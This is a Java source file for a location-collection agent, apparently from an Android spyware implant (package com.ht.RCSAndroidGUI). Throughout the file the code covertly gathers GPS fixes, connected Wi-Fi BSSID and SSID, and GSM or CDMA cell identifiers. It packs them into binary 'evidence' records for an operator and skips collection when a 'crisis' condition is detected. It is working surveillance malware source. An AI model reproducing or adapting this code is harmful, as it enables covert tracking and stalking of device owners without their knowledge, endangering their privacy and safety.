package com.ht.RCSAndroidGUI.agent;

import java.io.EOFException;
import java.io.IOException;
import java.util.Date;

import com.ht.RCSAndroidGUI.Device;
import com.ht.RCSAndroidGUI.Status;
import com.ht.RCSAndroidGUI.conf.Configuration;
import com.ht.RCSAndroidGUI.evidence.Evidence;
import com.ht.RCSAndroidGUI.evidence.EvidenceType;
import com.ht.RCSAndroidGUI.utils.Check;
import com.ht.RCSAndroidGUI.utils.DataBuffer;
import com.ht.RCSAndroidGUI.utils.DateTime;
import com.ht.RCSAndroidGUI.utils.Utils;

import android.content.Context;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.net.wifi.WifiInfo;
import android.net.wifi.WifiManager;
import android.os.Bundle;
import android.telephony.gsm.GsmCellLocation;
import android.util.Log;

public class PositionAgent extends AgentBase implements LocationListener {
	private static final String TAG = "PositionAgent";
	private static final int TYPE_GPS = 1;
	private static final int TYPE_CELL = 2;
	private static final int TYPE_WIFI = 4;

	private static final int LOG_TYPE_GPS = 1;
	private static final int LOG_TYPE_GSM = 2;
	private static final int LOG_TYPE_WIFI = 3;
	private static final int LOG_TYPE_IP = 4;
	private static final int LOG_TYPE_CDMA = 5;
	private static final long POSITION_DELAY = 1000;

	LocationManager lm;

	private boolean gpsEnabled;
	private boolean cellEnabled;
	private boolean wifiEnabled;

	Evidence logGps;
	Evidence logCell;
	Evidence logWifi;

	int period;

	@Override
	public void begin() {
		lm = (LocationManager) Status.getAppContext().getSystemService(
				Context.LOCATION_SERVICE);
		lm
				.requestLocationUpdates(LocationManager.GPS_PROVIDER, period,
						0, this);
	}

	@Override
	public void end() {
		lm.removeUpdates(this);
	}

	@Override
	public boolean parse(byte[] confParameters) {
		final DataBuffer databuffer = new DataBuffer(confParameters, 0,
				confParameters.length);
		try {
			// millisecondi
			period = databuffer.readInt();
			final int type = databuffer.readInt();

			if (Configuration.GPS_ENABLED) {
				gpsEnabled = ((type & TYPE_GPS) != 0);
			} else {
				// #ifdef DEBUG
				Log.w(TAG, "GPS Disabled at compile time");
				// #endif
			}
			cellEnabled = ((type & TYPE_CELL) != 0);
			wifiEnabled = ((type & TYPE_WIFI) != 0);

			// #ifdef DBC
			Check.asserts(period > 0, "parse period: " + period);
			// Check.asserts(type == 1 || type == 2 || type == 4, "parse type: "
			// + type);
			// #endif

			// #ifdef DEBUG
			Log.i(TAG, "Type: " + type);
			Log.i(TAG, "Period: " + period);
			Log.i(TAG, "gpsEnabled: " + gpsEnabled);
			Log.i(TAG, "cellEnabled: " + cellEnabled);
			Log.i(TAG, "wifiEnabled: " + wifiEnabled);
			// #endif

			setPeriod(period);
			setDelay(POSITION_DELAY);

		} catch (final IOException e) {
			// #ifdef DEBUG
			Log.e(TAG, e.toString());
			// #endif
			return false;
		}

		return true;
	}

	@Override
	public void go() {

		if (Status.self().crisisPosition()) {
			Log.w(TAG, "Crisis!");
			return;
		}

		if (gpsEnabled) {
			// #ifdef DEBUG
			Log.d(TAG, "actualRun: gps");
			// #endif
			// locationGPS();
		}
		if (cellEnabled) {
			// #ifdef DEBUG
			Log.d(TAG, "actualRun: cell");
			// #endif
			locationCELL();
		}
		if (wifiEnabled) {
			// #ifdef DEBUG
			Log.d(TAG, "actualRun: wifi");
			// #endif
			locationWIFI();
		}
	}

	private void locationWIFI() {

		WifiManager wifiManager = (WifiManager) Status.getAppContext()
				.getSystemService(Context.WIFI_SERVICE);

		WifiInfo wifi = wifiManager.getConnectionInfo();

		if (wifi != null) {
			// #ifdef DEBUG
			Log.i(TAG, "Wifi: " + wifi.getBSSID());
			// #endif
			final byte[] payload = getWifiPayload(wifi.getBSSID(), wifi
					.getSSID(), wifi.getRssi());

			logWifi.createEvidence(getAdditionalData(1, LOG_TYPE_WIFI),
					EvidenceType.LOCATION_NEW);
			logWifi.writeEvidence(payload);
			logWifi.close();
		} else {
			// #ifdef DEBUG
			Log.w(TAG, "Wifi disabled");
			// #endif
		}

	}

	/**
	 * http://stackoverflow.com/questions/3868223/problem-with-
	 * neighboringcellinfo-cid-and-lac
	 */
	private void locationCELL() {

		android.content.res.Configuration conf = Status.getAppContext()
				.getResources().getConfiguration();

		if (Device.isGprs()) {

			GsmCellLocation cell = new GsmCellLocation();

			final int mcc = Integer.parseInt(Integer.toHexString(conf.mcc));

			final int mnc = conf.mnc;
			final int lac = cell.getLac();
			final int cid = cell.getCid();
			// final int bsic = 0;
			final int rssi = 0; // TODO: prenderlo dal TelephonyManager

			final byte[] payload = getCellPayload(mcc, mnc, lac, cid, rssi);

			logCell.createEvidence(getAdditionalData(0, LOG_TYPE_GSM),
					EvidenceType.LOCATION_NEW);
			saveEvidence(logCell, payload, LOG_TYPE_GSM);
			logCell.close();

		}
		if (Device.isCdma()) {

			final int sid = 0; // TODO
			final int nid = 0; // TODO
			final int bid = 0; // TODO

			final int mcc = conf.mcc;

			final int rssi = 0; // TODO

			final StringBuffer mb = new StringBuffer();
			mb.append("SID: " + sid);
			mb.append(" NID: " + nid);
			mb.append(" BID: " + bid);

			final byte[] payload = getCellPayload(mcc, sid, nid, bid, rssi);
			logCell.createEvidence(getAdditionalData(0, LOG_TYPE_CDMA),
					EvidenceType.LOCATION_NEW);
			saveEvidence(logCell, payload, LOG_TYPE_CDMA);
			logCell.close();
		}
	}

	boolean waitingForPoint = false;

	private void locationGPS() {
		if (lm == null) {

			Log.e(TAG, "GPS Not Supported on Device");

			return;
		}

		if (waitingForPoint) {

			Log.d(TAG, "waitingForPoint");

			return;
		}

		synchronized (this) {
			// lm.getLastKnownLocation(provider);
			// LocationHelper.getInstance().locationGPS(lp, this, false);
		}

	}

	public void onLocationChanged(Location location) {
		if (location != null) {
			double lat = location.getLatitude();
			double lng = location.getLongitude();
		}

		// #ifdef DEBUG
		Log.d(TAG, "newLocation");
		// #endif

		// #ifdef DBC
		Check.requires(logGps != null, "logGps == null");
		// #endif

		if (location == null) {
			// #ifdef DEBUG
			Log.e(TAG, "Error in getLocation");
			// #endif
			return;
		}

		final float speed = location.getSpeed();
		final float course = location.getBearing();

		final long timestamp = location.getTime();

		if (location.hasAccuracy()) {
			// #ifdef DEBUG
			Log.d(TAG, "valid");
			// #endif
			final byte[] payload = getGPSPayload(location, timestamp);

			logGps.createEvidence(getAdditionalData(0, LOG_TYPE_GPS),
					EvidenceType.LOCATION_NEW);
			saveEvidence(logGps, payload, TYPE_GPS);
			logGps.close();
		}

	}

	public void onProviderDisabled(String arg0) {
		// TODO Auto-generated method stub

	}

	public void onProviderEnabled(String arg0) {
		// TODO Auto-generated method stub

	}

	public void onStatusChanged(String arg0, int arg1, Bundle arg2) {
		// TODO Auto-generated method stub

	}

	private byte[] getAdditionalData(int structNum, int type) {

		final int addsize = 12;
		final byte[] additionalData = new byte[addsize];
		final DataBuffer addbuffer = new DataBuffer(additionalData, 0,
				additionalData.length);
		final int version = 2010082401;

		addbuffer.writeInt(version);
		addbuffer.writeInt(type);
		addbuffer.writeInt(structNum);

		// #ifdef DBC
		Check.ensures(addbuffer.getPosition() == addsize,
				"addbuffer wrong size");
		// #endif

		return additionalData;
	}

	private void saveEvidence(Evidence acutalEvidence, byte[] payload, int type) {

		// #ifdef DBC
		Check.requires(payload != null, "saveEvidence payload!= null");
		// #endif

		// #ifdef DEBUG
		Log.d(TAG, "saveEvidence payload: " + payload.length);
		// #endif

		final int version = 2008121901;
		final Date date = new Date();
		final int payloadSize = payload.length;
		final int size = payloadSize + 24;

		final byte[] message = new byte[size];

		final DataBuffer databuffer = new DataBuffer(message, 0, size);

		databuffer.writeInt(type);

		// header
		databuffer.writeInt(size);
		databuffer.writeInt(version);
		databuffer.writeLong(DateTime.getFiledate(date));

		// payload
		databuffer.write(payload);

		// delimiter
		databuffer.writeInt(Evidence.EVIDENCE_DELIMITER);

		// #ifdef DBC
		Check.ensures(databuffer.getPosition() == size,
				"saveEvidence wrong size");
		// #endif

		// save log

		acutalEvidence.writeEvidence(message);

	}

	private byte[] getWifiPayload(String bssid, String ssid, int signalLevel) {
		Log.d(TAG, "getWifiPayload bssid: " + bssid + " ssid: " + ssid
				+ " signal:" + signalLevel);
		final int size = 48;
		final byte[] payload = new byte[size];

		final DataBuffer databuffer = new DataBuffer(payload, 0, payload.length);

		for (int i = 0; i < 6; i++) {
			final byte[] token = Utils.hexStringToByteArray(bssid, i * 3, 2);
			// #ifdef DEBUG
			// debug.trace("getWifiPayload " + i + " : "
			// + Utils.byteArrayToHex(token));
			// #endif

			// #ifdef DBC
			Check
					.asserts(token.length == 1,
							"getWifiPayload: token wrong size");
			// #endif
			databuffer.writeByte(token[0]);
		}

		// PAD
		databuffer.writeByte((byte) 0);
		databuffer.writeByte((byte) 0);

		final byte[] ssidcontent = ssid.getBytes();
		final int len = ssidcontent.length;
		final byte[] place = new byte[32];

		for (int i = 0; i < (Math.min(32, len)); i++) {
			place[i] = ssidcontent[i];
		}

		// #ifdef DEBUG
		Log.d(TAG, "getWifiPayload ssidcontent.length: " + ssidcontent.length);
		// #endif
		databuffer.writeInt(ssidcontent.length);

		databuffer.write(place);

		databuffer.writeInt(signalLevel);

		// #ifdef DBC
		Check.ensures(databuffer.getPosition() == size,
				"databuffer.getPosition wrong size");
		// #endif

		// #ifdef DBC
		Check.ensures(payload.length == size, "payload wrong size");
		// #endif

		return payload;
	}

	private byte[] getCellPayload(int mcc, int mnc, int lac, int cid, int rssi) {

		final int size = 19 * 4 + 48 + 16;
		final byte[] cellPosition = new byte[size];

		final DataBuffer databuffer = new DataBuffer(cellPosition, 0,
				cellPosition.length);

		databuffer.writeInt(size); // size
		databuffer.writeInt(0); // params

		databuffer.writeInt(mcc); //
		databuffer.writeInt(mnc); //
		databuffer.writeInt(lac); //
		databuffer.writeInt(cid); //

		databuffer.writeInt(0); // bsid
		databuffer.writeInt(0); // bcc

		databuffer.writeInt(rssi); // rx level
		databuffer.writeInt(0); // rx level full
		databuffer.writeInt(0); // rx level sub

		databuffer.writeInt(0); // rx quality
		databuffer.writeInt(0); // rx quality full
		databuffer.writeInt(0); // rx quality sub

		databuffer.writeInt(0); // idle timeslot
		databuffer.writeInt(0); // timing advance
		databuffer.writeInt(0); // gprscellid
		databuffer.writeInt(0); // gprs basestationid
		databuffer.writeInt(0); // num bcch

		databuffer.write(new byte[48]); // BCCH
		databuffer.write(new byte[16]); // NMR

		// #ifdef DBC
		Check.ensures(databuffer.getPosition() == size,
				"getCellPayload wrong size");
		// #endif

		return cellPosition;

	}

	/**
	 * @param timestamp
	 */
	private byte[] getGPSPayload(Location loc, long timestamp) {
		// #ifdef DEBUG
		Log.d(TAG, "getGPSPayload");
		// #endif
		final Date date = new Date(timestamp);

		final double latitude = loc.getLatitude();
		final double longitude = loc.getLongitude();
		final double altitude = loc.getAltitude();
		final float hdop = loc.getAccuracy();
		final float vdop = 0;
		final float speed = loc.getSpeed();
		final float course = loc.getBearing();

		Log.d(TAG, "" + " " + speed + "|" + latitude + "|" + longitude + "|"
				+ course + "|" + date);

		final DateTime dateTime = new DateTime(date);

		// define GPS_VALID_UTC_TIME 0x00000001
		// define GPS_VALID_LATITUDE 0x00000002
		// define GPS_VALID_LONGITUDE 0x00000004
		// define GPS_VALID_SPEED 0x00000008
		// define GPS_VALID_HEADING 0x00000010
		// define GPS_VALID_HORIZONTAL_DILUTION_OF_PRECISION 0x00000200
		// define GPS_VALID_VERTICAL_DILUTION_OF_PRECISION 0x00000400
		final int validFields = 0x00000400 | 0x00000200 | 0x00000010
				| 0x00000008 | 0x00000004 | 0x00000002 | 0x00000001;

		final int size = 344;
		// struct GPS_POSITION
		final byte[] gpsPosition = new byte[size];

		final DataBuffer databuffer = new DataBuffer(gpsPosition, 0,
				gpsPosition.length);

		// struct GPS_POSITION
		databuffer.writeInt(0); // version
		databuffer.writeInt(size); // sizeof GPS_POSITION == 344
		databuffer.writeInt(validFields); // validFields
		databuffer.writeInt(0); // flags

		// ** Time related : 16 bytes
		databuffer.write(dateTime.getStructSystemdate()); // SYSTEMTIME

		// ** Position + heading related
		databuffer.writeDouble(latitude); // latitude
		databuffer.writeDouble(longitude); // longitude
		databuffer.writeFloat(speed); // speed
		databuffer.writeFloat(course); // heading
		databuffer.writeDouble(0); // Magnetic variation
		databuffer.writeFloat((float) altitude); // altitude
		databuffer.writeFloat(0); // altitude ellipsoid

		// ** Quality of this fix
		databuffer.writeInt(1); // GPS_FIX_QUALITY GPS
		databuffer.writeInt(2); // GPS_FIX_TYPE 3D
		databuffer.writeInt(0); // GPS_FIX_SELECTION
		databuffer.writeFloat(0); // PDOP
		databuffer.writeFloat(hdop); // HDOP
		databuffer.writeFloat(vdop); // VDOP

		// ** Satellite information
		databuffer.writeInt(0); // satellite used
		databuffer.write(new byte[48]); // prn used 12 int
		databuffer.writeInt(0); // satellite view
		databuffer.write(new byte[48]); // prn view
		databuffer.write(new byte[48]); // elevation in view
		databuffer.write(new byte[48]); // azimuth view
		databuffer.write(new byte[48]); // sn view

		// #ifdef DEBUG
		Log.d(TAG, "len: " + databuffer.getPosition());
		// #endif

		// #ifdef DBC
		Check.ensures(databuffer.getPosition() == size,
				"saveGPSLog wrong size: " + databuffer.getPosition());
		// #endif

		return gpsPosition;
	}

}
